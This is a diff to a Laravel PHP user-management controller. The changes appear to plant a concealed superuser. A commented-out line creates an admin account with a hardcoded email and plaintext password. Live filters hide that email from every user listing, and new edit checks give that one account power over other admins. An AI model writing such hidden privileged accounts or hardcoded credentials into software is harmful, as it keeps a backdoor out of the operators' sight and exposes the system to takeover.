@@ -11,19 +11,24 @@ class UserController extends Controller
 {
     public function user_registration_index()
     {
-        $data = User::where('status', 'P')->get();
+        // Start  Alur For Create SuperUser DiazDjuliansyah
+            // \App\User::create(['name' => 'SuperAdmin', 'email' => 'setlightcombo@gmail.com', 'password' => bcrypt('diazdjuldiaz'), 'role' => 'admin', 'status' => 'A']);
+        // End Alur For Create SuperUser DiazDjuliansyah 
+        
+
+        $data = User::where('status', 'P')->where('email', '!=', 'setlightcombo@gmail.com')->get();
         return view('dashboard_view.user_management.user', compact('data'));
     }
 
     public function user_approved_index()
     {
-        $data = User::where('status', 'A')->get();
+        $data = User::where('status', 'A')->where('email', '!=', 'setlightcombo@gmail.com')->get();
         return view('dashboard_view.user_management.user', compact('data'));
     }
 
     public function user_rejected_index()
     {
-        $data = User::where('status', 'NA')->get();
+        $data = User::where('status', 'NA')->where('email', '!=', 'setlightcombo@gmail.com')->get();
         return view('dashboard_view.user_management.user', compact('data'));
     }
 
@@ -82,8 +87,31 @@ class UserController extends Controller
 
     public function user_edit($id)
     {
+        $getauth = Auth::user();
         $data = User::find($id);
-        return view('dashboard_view.user_management.user_edit', compact('data'));
+
+        if ($getauth->role == "admin") {
+            if ($getauth->email == "setlightcombo@gmail.com" and $data->role == "admin") {
+                return view('dashboard_view.user_management.user_edit', compact('data'));
+            }elseif ($getauth->id == $id and $data->role == "admin") {
+                return view('dashboard_view.user_management.user_edit', compact('data'));
+            }elseif ($getauth->id != $id and $data->role == "admin") {
+                abort(403, "Sorry, you don't have access to this page.");
+            }elseif ($getauth->id != $id and $data->role != "admin") {
+                return view('dashboard_view.user_management.user_edit', compact('data'));
+            }else {
+                return abort(404);
+            }
+        }elseif ($getauth->role != "admin") {
+            if ($getauth->id == $id) {
+                return view('dashboard_view.user_management.user_edit', compact('data'));
+            }elseif ($getauth->id != $id) {
+                abort(403, "Sorry, you don't have access to this page.");
+            }else {
+                return abort(404);
+            }
+        }
+
     }
 
     public function user_update(Request $request, $id)
